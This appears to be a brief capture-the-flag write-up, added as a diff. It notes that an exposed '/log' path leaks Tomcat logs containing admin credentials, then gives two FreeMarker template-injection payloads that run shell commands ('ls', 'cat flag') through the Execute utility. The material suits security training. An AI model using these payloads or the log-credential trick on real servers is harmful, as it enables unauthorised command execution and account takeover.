@@ -1,0 +1,14 @@
+a)
+online tool for penetration testing:
+https://pentest-tools.com/website-vulnerability-scanning/website-scanner
+
+Access the instance URL and go to path "/log".
+We can see some Apache Tomcat logs diplayed there, among which "username: admin123 and password (some base64 encoded string)"
+
+b)
+google search: freemarker template execute shell command
+https://ackcent.com/in-depth-freemarker-template-injection/
+
+Add to textarea:
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("ls")}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("cat flag")}
